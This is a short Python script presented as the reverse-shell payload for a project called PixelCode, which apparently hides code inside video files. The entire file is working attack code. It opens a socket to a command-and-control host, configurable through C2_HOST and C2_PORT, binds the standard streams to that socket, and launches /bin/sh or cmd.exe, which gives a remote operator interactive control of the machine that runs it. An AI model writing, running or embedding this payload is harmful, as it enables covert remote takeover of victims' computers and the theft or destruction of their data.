#!/usr/bin/env python3
"""
Reverse Shell payload for PixelCode
This is the actual payload that gets encoded into the video
"""

import socket
import subprocess
import os
import sys
import threading

def reverse_shell(host="192.168.1.100", port=4444):
    """Simple reverse shell implementation"""
    try:
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Redirect stdin/stdout/stderr to socket
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Start interactive shell
        subprocess.call(["/bin/sh" if os.name != "nt" else "cmd.exe"])
        
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    # You can change these or get from environment
    host = os.environ.get("C2_HOST", "192.168.1.100")
    port = int(os.environ.get("C2_PORT", "4444"))
    
    reverse_shell(host, port)
